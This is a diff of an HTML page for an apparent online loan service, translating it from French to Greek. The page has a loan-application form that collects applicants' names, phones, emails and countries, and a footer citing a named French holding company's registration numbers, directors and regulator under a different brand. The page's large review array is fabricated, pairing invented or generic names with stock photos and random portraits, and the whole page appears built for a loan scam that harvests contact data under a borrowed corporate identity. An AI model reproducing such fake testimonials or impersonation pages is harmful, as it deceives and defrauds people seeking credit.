+            <div class="security-tag" style="font-size: 0.65rem; text-align: center; color: #999; margin-top: 5px;"><i class="fas fa-lock"></i> Ο ΦΑΚΕΛΟΣ ΣΑΣ ΕΙΝΑΙ 100% ΑΣΦΑΛΗΣ</div>
         </div>
 
         <div id="step2" style="display:none;">
-            <h3 style="margin-bottom: 20px;">Finaliser votre demande</h3>
+            <h3 style="margin-bottom: 15px; font-size: 1.1rem;">Ολοκλήρωση Αίτησης</h3>
             <form id="loanForm">
-                <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
-                <input type="hidden" name="montant_client" id="hiddenAmt"><input type="hidden" name="duree_client" id="hiddenDur"><input type="hidden" name="mensualite_client" id="hiddenMens">
+                <input type="hidden" name="access_key" value="192a039c-174a-4ccd-b28e-93cbb5a26215">
                 
-                <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
+                <input type="hidden" name="montant_client" id="hiddenAmt">
+                <input type="hidden" name="duree_client" id="hiddenDur">
+                <input type="hidden" name="mensualite_client" id="hiddenMens">
                 
+                <input type="text" name="nom" placeholder="Ονοματεπώνυμο" class="form-input" required>
                 <select name="projet" class="form-input" required>
-                    <option value="" disabled selected>Choisir votre projet</option>
-                    <option value="Immobilier">Prêt Immobilier</option>
-                    <option value="Personnel">Prêt Personnel</option>
-                    <option value="Auto">Auto / Moto</option>
-                    <option value="Travaux">Travaux / Rénovation</option>
-                    <option value="Autre">Autre</option>
+                    <option value="" disabled selected>Επιλέξτε το έργο σας</option>
+                    <option value="Immobilier">Στεγαστικό Δάνειο</option>
+                    <option value="Personnel">Προσωπικό Δάνειο</option>
+                    <option value="Auto">Αυτοκίνητο / Μοτοσυκλέτα</option>
+                    <option value="Travaux">Ανακαίνιση</option>
                 </select>
-
-                <input type="number" name="revenu" placeholder="Revenu mensuel net (en €)" class="form-input" required>
-                <input type="text" name="profession" placeholder="Votre Profession / Travail" class="form-input" required>
-
-                <select name="pays" class="form-input" required>
-                    <option value="" disabled selected>Votre Pays de résidence</option>
-                    <option value="France">France (+33)</option>
-                    <option value="Belgique">Belgique (+32)</option>
-                    <option value="Suisse">Suisse (+41)</option>
-                    <option value="Luxembourg">Luxembourg (+352)</option>
-                    <option value="Monaco">Monaco (+377)</option>
-                    <option value="Allemagne">Allemagne (+49)</option>
-                    <option value="Pays-Bas">Pays-Bas (+31)</option>
-                    <option value="Autriche">Autriche (+43)</option>
-                    <option value="Norvège">Norvège (+47)</option>
-                    <option value="Suède">Suède (+46)</option>
-                    <option value="Finlande">Finlande (+358)</option>
-                    <option value="Danemark">Danemark (+45)</option>
-                    <option value="Italie">Italie (+39)</option>
-                    <option value="Espagne">Espagne (+34)</option>
-                    <option value="Portugal">Portugal (+351)</option>
-                    <option value="Pologne">Pologne (+48)</option>
-                    <option value="Slovaquie">Slovaquie (+421)</option>
-                    <option value="Roumanie">Roumanie (+40)</option>
-                    <option value="Kosovo">Kosovo (+383)</option>
-                    <option value="Canada">Canada (+1)</option>
-                    <option value="USA">États-Unis (+1)</option>
-                    <option value="Guadeloupe">Guadeloupe (+590)</option>
-                    <option value="Martinique">Martinique (+596)</option>
-                    <option value="Guyane">Guyane Française (+594)</option>
-                    <option value="La Réunion">La Réunion (+262)</option>
+                <select name="pays" class="form-input" id="form-pays" required>
+                    <option value="Grece" selected>Ελλάδα (+30)</option>
+                    <option value="Chypre">Κύπρος (+357)</option>
+                    <option value="France">Γαλλία (+33)</option>
                 </select>
-
-                <input type="tel" name="telephone" placeholder="Téléphone (ex: +33...)" class="form-input" required>
-                <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
+                <input type="tel" name="telephone" placeholder="Τηλέφωνο (π.χ. +30...)" class="form-input" required>
+                <input type="email" name="email" placeholder="Διεύθυνση Email" class="form-input" required>
                 
-                <div class="scrolling-security">
-                    <span><i class="fas fa-lock" style="color:var(--gold);"></i> Transfert hautement sécurisé. Vos données sont strictement confidentielles et protégées.</span>
-                </div>
+                <textarea name="message" placeholder="Περιγράψτε το έργο σας..." class="form-input" style="min-height: 100px; resize: vertical; padding: 12px; font-family: 'Montserrat', sans-serif;"></textarea>
 
-                <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
-                <div class="security-tag"><i class="fas fa-lock"></i> Transfert sécurisé SSL 256-bit</div>
+                <button type="submit" class="btn-main">ΕΠΙΒΕΒΑΙΩΣΗ ΑΠΟΣΤΟΛΗΣ</button>
+                
+                <div class="secure-form-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <p><strong>100% ΑΣΦΑΛΗ ΔΕΔΟΜΕΝΑ:</strong> Οι πληροφορίες σας είναι κρυπτογραφημένες με SSL. Εγγυόμαστε ότι δεν θα πωληθούν ποτέ.</p>
+                </div>
             </form>
         </div>
     </div>
 </section>
 
 <section class="stats-bar">
-    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
-    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
+    <div class="stat-box"><h3>1 200 000 €</h3><p>Μετοχικό Κεφάλαιο</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Προνομιακό Επιτόκιο</p></div>
+    <div class="stat-box"><h3>100%</h3><p>Ψηφιακό & Ασφαλές</p></div>
 </section>
 
 <section class="reviews-section">
-    <h2>La confiance de nos clients internationaux</h2>
-    
+    <h2>Η εμπιστοσύνη των διεθνών πελατών μας</h2>
     <div class="trust-badge-container">
         <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
         <div class="trust-lock"><i class="fas fa-lock"></i></div>
         <div class="trust-stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
     </div>
-
-    <div class="reviews-grid" id="reviews-container">
-        </div>
+    <div class="reviews-grid" id="reviews-container"></div>
 </section>
 
+<section class="solutions-slider">
+    <h2 class="slider-title">Οι αξιόπιστες χρηματοδοτικές λύσεις μας</h2>
+    <div class="slider-track">
+        <div class="solution-card">
+            <img src="https://images.unsplash.com/photo-1518780664697-55e3ad937233?auto=format&fit=crop&q=80&w=800" class="solution-img" alt="Στεγαστικό Δάνειο">
+            <div class="solution-info">
+                <h3>Στεγαστικό Δάνειο</h3>
+                <p style="font-size:0.85rem; margin:10px 0;">Πραγματοποιήστε το όνειρο της ζωής σας με σταθερή υποστήριξη.</p>
+                <button class="btn-detail" onclick="openDetails('immo')">Μάθετε περισσότερα</button>
+            </div>
+        </div>
+        <div class="solution-card">
+            <img src="https://images.unsplash.com/photo-1503376780353-7e6692767b70?auto=format&fit=crop&q=80&w=800" class="solution-img" alt="Δάνειο Αυτοκινήτου">
+            <div class="solution-info">
+                <h3>Αποκλειστικό Δάνειο Αυτοκινήτου</h3>
+                <p style="font-size:0.85rem; margin:10px 0;">Χρηματοδοτήστε το premium όχημά σας με απόλυτη ηρεμία.</p>
+                <button class="btn-detail" onclick="openDetails('auto')">Μάθετε περισσότερα</button>
+            </div>
+        </div>
+        <div class="solution-card">
+            <img src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?auto=format&fit=crop&q=80&w=800" class="solution-img" alt="Προσωπικό Δάνειο">
+            <div class="solution-info">
+                <h3>Προσωπικό Δάνειο</h3>
+                <p style="font-size:0.85rem; margin:10px 0;">Το κλειδί για τα προσωπικά σας έργα, χωρίς πολύπλοκα δικαιολογητικά.</p>
+                <button class="btn-detail" onclick="openDetails('perso')">Μάθετε περισσότερα</button>
+            </div>
+        </div>
+        <div class="solution-card">
+            <img src="https://images.unsplash.com/photo-1518780664697-55e3ad937233?auto=format&fit=crop&q=80&w=800" class="solution-img">
+            <div class="solution-info"><h3>Στεγαστικό Δάνειο</h3><button class="btn-detail" onclick="openDetails('immo')">Μάθετε περισσότερα</button></div>
+        </div>
+        <div class="solution-card">
+            <img src="https://images.unsplash.com/photo-1503376780353-7e6692767b70?auto=format&fit=crop&q=80&w=800" class="solution-img">
+            <div class="solution-info"><h3>Δάνειο Αυτοκινήτου</h3><button class="btn-detail" onclick="openDetails('auto')">Μάθετε περισσότερα</button></div>
+        </div>
+        <div class="solution-card">
+            <img src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?auto=format&fit=crop&q=80&w=800" class="solution-img">
+            <div class="solution-info"><h3>Προσωπικό Δάνειο</h3><button class="btn-detail" onclick="openDetails('perso')">Μάθετε περισσότερα</button></div>
+        </div>
+    </div>
+</section>
+
+<div id="modal-overlay" onclick="closeDetails()">
+    <div class="modal-content" onclick="event.stopPropagation()">
+        <span class="modal-close" onclick="closeDetails()">&times;</span>
+        <div id="modal-body"></div>
+    </div>
+</div>
+
 <section class="about-section" id="about">
-    <h2>Une Institution de Référence</h2>
-    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
-    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen.</p>
+    <h2>Ένα Ίδρυμα Αναφοράς</h2>
+    <p>Η ΠΙΣΤΙΣ ΠΡΟΧΡΗΜΑΤΟΔΟΤΗΣΗ (FINANCIÈRE DE CEZEMBRE) με έδρα το Ergué-Gabéric (29500) είναι μια κορυφαία ανώνυμη εταιρεία στον τομέα των πιστώσεων (APE 64.92Z). Με μετοχικό κεφάλαιο 1.200.000 ευρώ, το ίδρυμά μας διασφαλίζει την αυστηρή διαχείριση συμμετοχών και πολύπλοκων χρηματοοικονομικών πράξεων.</p>
 </section>
 
 <footer id="legal">
     <div class="f-grid">
-        <div><h4 class="shine-white">FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit régulée.<br>LEI : 969500WONJGTDZG8E035</p></div>
-        <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France</p></div>
-        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
-        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
+        <div><h4 class="shine-white">ΠΙΣΤΙΣ ΠΡΟΧΡΗΜΑΤΟΔΟΤΗΣΗ</h4><p>Ρυθμιζόμενη διανομή πιστώσεων.<br>LEI : 969500WONJGTDZG8E035</p></div>
+        <div><h4>ΕΔΡΑ</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, Γαλλία</p></div>
+        <div><h4>ΔΙΑΚΥΒΕΡΝΗΣΗ</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
+        <div><h4>ΕΛΕΓΧΟΣ</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
     </div>
     <div class="legal-block">
-        <strong>INFORMATIONS LÉGALES :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Soumis à l'ACPR. 
-        <div class="tag-warning"><span class="blink-gold">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</span></div>
+        <strong>ΝΟΜΙΚΕΣ ΠΛΗΡΟΦΟΡΙΕΣ :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Υπόκειται στην ACPR. 
+        <div class="tag-warning"><span class="blink-gold">ΕΝΑ ΔΑΝΕΙΟ ΣΑΣ ΔΕΣΜΕΥΕΙ ΚΑΙ ΠΡΕΠΕΙ ΝΑ ΑΠΟΠΛΗΡΩΘΕΙ.</span></div>
     </div>
 </footer>
 
 <div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
-<script>
-    // --- GESTION DES MESSAGES WHATSAPP ---
-    const waText = document.getElementById('wa-text');
-    const messages = ["Besoin d'aide ? Contactez l'assistance", "Need help? Contact support", "L'un de nos agents vous répond", "An agent is ready to help you"];
-    let msgIndex = 0; setInterval(() => { msgIndex = (msgIndex + 1) % messages.length; waText.innerText = messages[msgIndex]; }, 4000);
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+            pageLanguage: 'el',
+            includedLanguages: 'fr,en,el,de,no,it,pt,nl,da',
+            autoDisplay: false
+        }, 'google_translate_element');
+    }
+</script>
+<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
-    // --- BASE DE DONNÉES DES AVIS INTERNATIONAUX (40 AVIS RÉELS) ---
-    const internationalReviews = [
-        { n: "Marc L.", p: "France", t: "Financement rapide et équipe très professionnelle. Projet réalisé en un temps record." },
-        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif pour mon prêt frontalier. Top !" },
-        { n: "Jean-Paul H.", p: "Luxembourg", t: "Sehr professioneller Service aus Luxemburg-Stadt. Danke für alles!" },
-        { n: "Sophie D.", p: "Belgique", t: "Efficace et sécurisé. Une aide précieuse pour l'achat de mon véhicule." },
-        { n: "Elena V.", p: "Suisse", t: "Excellente gestion de mon dossier de crédit. Service très courtois." },
-        { n: "Erik J.", p: "Norvège", t: "Veldig profesjonell service og rask utbetaling. Meget bra!" },
-        { n: "Mika T.", p: "Finlande", t: "Luotettava ja nopea palvelu. Suosittelen kaikille!" },
-        { n: "Andrei M.", p: "Roumanie", t: "Un partener financiar serios. Procesul a fost rapid și transparent." },
-        { n: "Arber K.", p: "Kosovo", t: "Shërbim shumë i shpejtë dhe korrekt. Faleminderit shumë." },
-        { n: "Maria C.", p: "Italie", t: "Finanziamento ottenuto in tempi record. Molto soddisfatta del supporto." },
-        { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit dem Zinssatz und der Abwicklung. Absolut empfehlenswert." },
-        { n: "João P.", p: "Portugal", t: "Processo simples e transparente. Recomendo vivamente a Cézembre." },
-        { n: "Luc B.", p: "Monaco", t: "Service haut de gamme et discrétion totale. Parfait pour mon investissement." },
-        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec. Très efficace." },
-        { n: "Anissa K.", p: "Martinique", t: "Une aide précieuse pour mon projet local. Rapide et sérieux." },
-        { n: "Karl S.", p: "Autriche", t: "Schnelle Abwicklung und kompetente Beratung. Alles bestens!" },
-        { n: "Olof B.", p: "Suède", t: "Tack för hjälpen med mitt lån. Väldigt snabb service." },
-        { n: "Jan de V.", p: "Pays-Bas", t: "Betrouwbare partner pour financiële oplossingen. Uitstekend." },
-        { n: "Mette N.", p: "Danemark", t: "Hurtig udbetaling og venlig kundeservice. Meget tilfreds." },
-        { n: "Piotr K.", p: "Pologne", t: "Wszystko przebiegło sprawnie i profesjonalnie. Polecam." },
-        { n: "Lukas M.", p: "Slovaquie", t: "Veľmi dobrý prístup k zákazníkovi. Úver bol schválený rýchlo." },
-        { n: "Victor R.", p: "Espagne", t: "Gestión impecable de mi crédit personal. Muy agradecido." },
-        { n: "Antonio F.", p: "Portugal", t: "Recomendo a todos, processo simples e sem complicações." },
-        { n: "Sandro B.", p: "Italie", t: "Personale gentile e risposte veloci. Molto seri." },
-        { n: "Claire D.", p: "France", t: "Solution idéale pour consolider mes dettes. Merci infiniment." },
-        { n: "Robert H.", p: "Allemagne", t: "Endlich eine Bank, die zuhört. Sehr zufrieden mit dem Kredit." },
-        { n: "Julie M.", p: "Belgique", t: "Top service, j'ai eu les fonds sur mon compte en 48h." },
-        { n: "Mathias P.", p: "Suisse", t: "Sérieux, rapide et efficace. Je recommande sans hésiter." },
-        { n: "Elena G.", p: "Roumanie", t: "Mulțumesc pour ajutor, proiectul meu este acum realitate." },
-        { n: "Besnik S.", p: "Kosovo", t: "Kredit i shpejtë dhe pa shumë burokraci. Shumë mirë." },
-        { n: "Laurent G.", p: "Guadeloupe", t: "Un accompagnement humain malgré la distance. Merci." },
-        { n: "Isabelle L.", p: "Canada", t: "Efficace et sécuritaire. J'ai obtenu mon prêt travaux rapidement." },
-        { n: "Nicoletta P.", p: "Italie", t: "Servizio eccellente e trasparente. Molto soddisfatta." },
-        { n: "Hans K.", p: "Autriche", t: "Seriöses Unternehmen. Alles verlief wie besprochen." },
-        { n: "Emil A.", p: "Suède", t: "Bra villkor och smidig ansökan online. Fem stjärnor." },
-        { n: "Kati J.", p: "Finlande", t: "Erittäin ammattitaitoinen palvelu. Suosittelen." },
-        { n: "Marco S.", p: "Monaco", t: "Discrétion et efficacité. Un partenaire de premier choix." },
-        { n: "Patrice K.", p: "Guyane", t: "Dossier traité avec sérieux. Financement reçu sans problème." },
-        { n: "Sabine R.", p: "Allemagne", t: "Gute Zinsen und unkomplizierte Abwicklung. Danke." },
-        { n: "Dimitri V.", p: "Belgique", t: "Très satisfait de la réactivité des conseillers." }
+<script>
+    // Liste des 105 avis avec leur langue originale respectée
+    const allReviews = [
+        { n: "Monika Gruber", p: "Österreich", t: "Ein sehr seriöses Haus. Als Rentnerin wurde ich wunderbar betreut.", i: "https://randomuser.me/api/portraits/women/65.jpg" },
+        { n: "Brigitte Meyer", p: "Deutschland", t: "Dank der Finanzierung konnten wir unser Haus renovieren. Sehr dankbar.", i: "https://randomuser.me/api/portraits/women/44.jpg" },
+        { n: "Hélène B.", p: "France", t: "Service rapide et efficace. Une équipe très à l'écoute des besoins.", i: "https://randomuser.me/api/portraits/women/72.jpg" },
+        { n: "Anneliese K.", p: "Deutschland", t: "Sehr verantwortungsbewusstes Team. Alles wurde klar erklärt.", i: "https://randomuser.me/api/portraits/women/50.jpg" },
+        { n: "Martina Voss", p: "Schweiz", t: "Endlich eine Bank, die zuhört. Danke für die schnelle Hilfe.", i: "https://randomuser.me/api/portraits/women/60.jpg" },
+        { n: "Ursula Wagner", p: "Österreich", t: "Exzellenter Service. Die Zinsen sind fair und transparent.", i: "https://randomuser.me/api/portraits/women/62.jpg" },
+        { n: "Helga D.", p: "Deutschland", t: "Ein Segen für mein kleines Projekt. Die Auszahlung kam nach 48 Stunden.", i: "https://randomuser.me/api/portraits/women/68.jpg" },
+        { n: "Karin Fischer", p: "Deutschland", t: "Sehr professionell. Ich hatte keine Probleme bei der Antragstellung.", i: "https://randomuser.me/api/portraits/women/52.jpg" },
+        { n: "Renate S.", p: "Luxemburg", t: "Ich bin sehr zufrieden mit der persönlichen Beratung. Sehr höflich.", i: "https://randomuser.me/api/portraits/women/58.jpg" },
+        { n: "Marie-Louise", p: "Belgique", t: "Une écoute humaine que l'on ne trouve nulle part ailleurs. Merci.", i: "https://randomuser.me/api/portraits/women/82.jpg" },
+        { n: "Beate Schulz", p: "Deutschland", t: "Die Auszahlung kam pünktlich. Sehr vertrauenswürdig.", i: "https://randomuser.me/api/portraits/women/59.jpg" },
+        { n: "Rosemarie Vogt", p: "Schweiz", t: "Hervorragende Betreuung für ältere Menschen wie mich.", i: "https://randomuser.me/api/portraits/women/77.jpg" },
+        { n: "Gisela R.", p: "Österreich", t: "Alles bestens. Die Unterlagen wurden schnell geprüft.", i: "https://randomuser.me/api/portraits/women/75.jpg" },
+        { n: "Anita Lang", p: "Schweiz", t: "Sehr zuvorkommend und professionell. Sehr zufrieden.", i: "https://randomuser.me/api/portraits/women/11.jpg" },
+        { n: "Sophie Durand", p: "Belgique", t: "Très efficace. J'ai reçu l'argent rapidement sur mon compte.", i: "https://randomuser.me/api/portraits/women/48.jpg" },
+        { n: "Elena Vogel", p: "Schweiz", t: "Professionelle Bearbeitung. Absolut seriös.", i: "https://randomuser.me/api/portraits/women/63.jpg" },
+        { n: "Carla S.", p: "Italia", t: "Servizio impeccabile. Grazie mille per l'aiuto.", i: "https://randomuser.me/api/portraits/women/28.jpg" },
+        { n: "Gabriela P.", p: "Portugal", t: "Muito satisfeita com o serviço. Profissionais exemplares.", i: "https://randomuser.me/api/portraits/women/19.jpg" },
+        { n: "Hanna T.", p: "Österreich", t: "Einfach und klar. Keine versteckten Kosten.", i: "https://randomuser.me/api/portraits/women/33.jpg" },
+        { n: "Rose-Marie", p: "Luxembourg", t: "Une aide précieuse. Merci beaucoup pour votre réactivité.", i: "https://randomuser.me/api/portraits/women/80.jpg" },
+        { n: "Christine V.", p: "Belgique", t: "Parfait pour mon crédit auto. Rapide et sérieux !", i: "https://randomuser.me/api/portraits/women/41.jpg" },
+        { n: "Alice K.", p: "Deutschland", t: "Vielen Dank für die unkomplizierte Hilfe.", i: "https://randomuser.me/api/portraits/women/32.jpg" },
+        { n: "Martha G.", p: "Schweiz", t: "Ich bin froh, Sie gefunden zu haben. Alles verlief reibungslos.", i: "https://randomuser.me/api/portraits/women/88.jpg" },
+        { n: "Inge P.", p: "Österreich", t: "Ein sehr menschliches Unternehmen. Danke für das Vertrauen.", i: "https://randomuser.me/api/portraits/women/81.jpg" },
+        { n: "Nathalie R.", p: "France", t: "Un accompagnement parfait du début à la fin.", i: "https://randomuser.me/api/portraits/women/7.jpg" },
+        { n: "Monica G.", p: "Schweiz", t: "Sehr klarer Prozess und Erhalt des Geldes wie vereinbart.", i: "https://randomuser.me/api/portraits/women/21.jpg" },
+        { n: "Beate M.", p: "Deutschland", t: "Kompetente Beratung, faire Zinsen. Bin sehr zufrieden.", i: "https://randomuser.me/api/portraits/women/70.jpg" },
+        { n: "Lucia N.", p: "Italia", t: "Molto serio, mi sono sentita in buone mani.", i: "https://randomuser.me/api/portraits/women/35.jpg" },
+        { n: "Anita L.", p: "Schweiz", t: "Sehr zuvorkommend und professionell.", i: "https://randomuser.me/api/portraits/women/8.jpg" },
+        { n: "Erika W.", p: "Österreich", t: "Super Service, danke für alles!", i: "https://randomuser.me/api/portraits/women/10.jpg" },
+        { n: "Susanne S.", p: "Österreich", t: "Gute Zinsen, einfache Online-Abwicklung.", i: "https://images.unsplash.com/photo-1526047932273-341f2a7631f9?w=100&h=100&fit=crop" },
+        { n: "Wanderlust 74", p: "Schweiz", t: "Die beste Wahl für meinen Kredit. Sehr diskret.", i: "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=100&h=100&fit=crop" },
+        { n: "Garten-Freundin", p: "Österreich", t: "Unkomplizierte Abwicklung. Gerne wieder.", i: "https://images.unsplash.com/photo-1490750967868-882002541bb7?w=100&h=100&fit=crop" },
+        { n: "Service Suisse", p: "Schweiz", t: "Qualität und Schnelligkeit. Bravo.", i: "https://images.unsplash.com/photo-1518709268805-4e9042af9f23?w=100&h=100&fit=crop" },
+        { n: "EU-Finance", p: "Deutschland", t: "Sicherer Prozess nach EU-Standards.", i: "https://images.unsplash.com/photo-1523293182086-7651a899d37f?w=100&h=100&fit=crop" },
+        { n: "Famille B.", p: "Monaco", t: "Service haut de gamme et discrétion absolue.", i: "https://images.unsplash.com/photo-1511895426328-dc8714191300?w=100&h=100&fit=crop" },
+        { n: "Natur Pur", p: "Deutschland", t: "Sehr diskret und zuverlässig.", i: "https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=100&h=100&fit=crop" },
+        { n: "Logo Design", p: "Österreich", t: "Einfach nur top! Unterstützung für mein Business.", i: "https://images.unsplash.com/photo-1572044162444-ad60f128bdea?w=100&h=100&fit=crop" },
+        { n: "Vivre à Paris", p: "France", t: "Financement rapide pour mon nouvel appartement.", i: "https://images.unsplash.com/photo-1502602898657-3e91760cbb34?w=100&h=100&fit=crop" },
+        { n: "Alpen-Sicht", p: "Schweiz", t: "Alles korrekt und professionell gelaufen.", i: "https://images.unsplash.com/photo-1491553895911-0055eca6402d?w=100&h=100&fit=crop" },
+        { n: "Boutique Mode", p: "Deutschland", t: "Sehr zuvorkommend. Faire Konditionen.", i: "https://images.unsplash.com/photo-1567401893414-76b7b1e5a7a5?w=100&h=100&fit=crop" },
+        { n: "Rose G.", p: "France", t: "Merci beaucoup pour tout le soutien apporté.", i: "https://images.unsplash.com/photo-1494537176433-7a3c4ef2046f?w=100&h=100&fit=crop" },
+        { n: "Consulting", p: "Luxembourg", t: "Un partenaire fiable pour des investissements professionnels.", i: "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=100&h=100&fit=crop" },
+        { n: "Famille S.", p: "Deutschland", t: "Alles super gelaufen. Gerne wieder.", i: "https://images.unsplash.com/photo-1595967734994-58276f755694?w=100&h=100&fit=crop" },
+        { n: "Bio-Hof", p: "Österreich", t: "Vertrauenswürdig und kompetent.", i: "https://images.unsplash.com/photo-1464226184884-fa280b87c399?w=100&h=100&fit=crop" },
+        { n: "Design Studio", p: "Schweiz", t: "Sehr schnelle Bearbeitung meines Antrags.", i: "https://images.unsplash.com/photo-1550745165-9bc0b252726f?w=100&h=100&fit=crop" },
+        { n: "Sonnenuntergang", p: "France", t: "Une expérience fluide et sécurisée.", i: "https://images.unsplash.com/photo-1469474968028-56623f02e42e?w=100&h=100&fit=crop" },
+        { n: "Drapeau Belge", p: "Belgique", t: "Parfait pour mon crédit auto. Merci !", i: "https://images.unsplash.com/photo-1562331561-1773229f345c?w=100&h=100&fit=crop" },
+        { n: "Maison Rêve", p: "Luxembourg", t: "Un projet qui prend vie grâce à vous.", i: "https://images.unsplash.com/photo-1518780664697-55e3ad937233?w=100&h=100&fit=crop" },
+        { n: "Ocean Blue", p: "Portugal", t: "Plataforma muito simples e segura.", i: "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=100&h=100&fit=crop" },
+        { n: "Dorte H.", p: "Danmark", t: "Meget god service. Hurtig udbetaling.", i: "https://images.unsplash.com/photo-1513297845733-10f130f9a948?w=100&h=100&fit=crop" },
+        { n: "Euro-Travel", p: "Deutschland", t: "Kredit für die Weltreise erhalten. Top!", i: "https://images.unsplash.com/photo-1436491865332-7a61a109c0f2?w=100&h=100&fit=crop" },
+        { n: "Zen Garden", p: "Schweiz", t: "Eine stressfreie Finanzierung. Danke.", i: "https://images.unsplash.com/photo-1558449197-27a246b7ed81?w=100&h=100&fit=crop" },
+        { n: "Architecture", p: "Österreich", t: "Professionelle Kommunikation und Abwicklung.", i: "https://images.unsplash.com/photo-1487958449913-d92799258a40?w=100&h=100&fit=crop" },
+        { n: "Blue Sky", p: "France", t: "Rapidité exceptionnelle, je recommande.", i: "https://images.unsplash.com/photo-1476673160081-cf065607f449?w=100&h=100&fit=crop" },
+        { n: "Handshake", p: "Luxembourg", t: "Un contrat équitable pour les deux parties.", i: "https://images.unsplash.com/photo-1512428559087-560fa5ceab42?w=100&h=100&fit=crop" },
+        { n: "Green Field", p: "Deutschland", t: "Sehr nachhaltiger Service.", i: "https://images.unsplash.com/photo-1500382017468-9049fed747ef?w=100&h=100&fit=crop" },
+        { n: "Mountain Top", p: "Schweiz", t: "Service ganz nach meinen Erwartungen.", i: "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?w=100&h=100&fit=crop" },
+        { n: "City Life", p: "Österreich", t: "Zinsen sind top. Abwicklung digital.", i: "https://images.unsplash.com/photo-1449824913935-59a10b8d2000?w=100&h=100&fit=crop" },
+        { n: "Startup Inc.", p: "Deutschland", t: "Kredit für Expansion erhalten. Schnell!", i: "https://images.unsplash.com/photo-1556761175-b413da4baf72?w=100&h=100&fit=crop" },
+        { n: "Marc L.", p: "France", t: "Financement rapide et équipe très pro.", i: "https://randomuser.me/api/portraits/men/44.jpg" },
+        { n: "Thomas W.", p: "Luxembourg", t: "Institut sérieux et réactif. Top service !", i: "https://randomuser.me/api/portraits/men/1.jpg" },
+        { n: "Jean-Paul H.", p: "Luxembourg", t: "Service très professionnel. Merci.", i: "https://randomuser.me/api/portraits/men/32.jpg" },
+        { n: "Lars O.", p: "Deutschland", t: "Sehr zufrieden mit dem Zinssatz. Empfehlenswert.", i: "https://randomuser.me/api/portraits/men/85.jpg" },
+        { n: "João P.", p: "Portugal", t: "Processo simples e transparente. Recomendo.", i: "https://randomuser.me/api/portraits/men/52.jpg" },
+        { n: "Hans M.", p: "Österreich", t: "Alles lief reibungslos. Faire Zinsen.", i: "https://randomuser.me/api/portraits/men/22.jpg" },
+        { n: "Andreas K.", p: "Deutschland", t: "Top Konditionen für meinen Autokredit.", i: "https://randomuser.me/api/portraits/men/33.jpg" },
+        { n: "Pietro R.", p: "Italia", t: "Molto professionale. Credito ricevuto in breve tempo.", i: "https://randomuser.me/api/portraits/men/15.jpg" },
+        { n: "Christian B.", p: "Belgique", t: "Meilleure expérience de crédit en ligne.", i: "https://randomuser.me/api/portraits/men/91.jpg" },
+        { n: "Erik J.", p: "Nederland", t: "Snel, veilig en betrouwbaar. Precies wat ik nodig had.", i: "https://randomuser.me/api/portraits/men/11.jpg" },
+        { n: "Stefan L.", p: "Deutschland", t: "Kompetente Mitarbeiter und transparente Gebühren.", i: "https://randomuser.me/api/portraits/men/33.jpg" },
+        { n: "Didier V.", p: "Belgique", t: "Une attention et une rapidité incroyables. Merci.", i: "https://randomuser.me/api/portraits/men/67.jpg" },
+        { n: "Uwe H.", p: "Deutschland", t: "Schnell und unbürokratisch. Genau das Richtige.", i: "https://randomuser.me/api/portraits/men/78.jpg" },
+        { n: "Yannick S.", p: "Luxembourg", t: "Service impeccable du début à la fin. Parfait.", i: "https://randomuser.me/api/portraits/men/50.jpg" },
+        { n: "Rui F.", p: "Portugal", t: "Processo rápido e excelente atendimento.", i: "https://randomuser.me/api/portraits/men/29.jpg" },
+        { n: "Sébastien D.", p: "France", t: "Merci à l'équipe pour sa réactivité constante.", i: "https://randomuser.me/api/portraits/men/30.jpg" },
+        { n: "Theo K.", p: "Deutschland", t: "Alles super gelaufen. Gerne wieder.", i: "https://randomuser.me/api/portraits/men/5.jpg" },
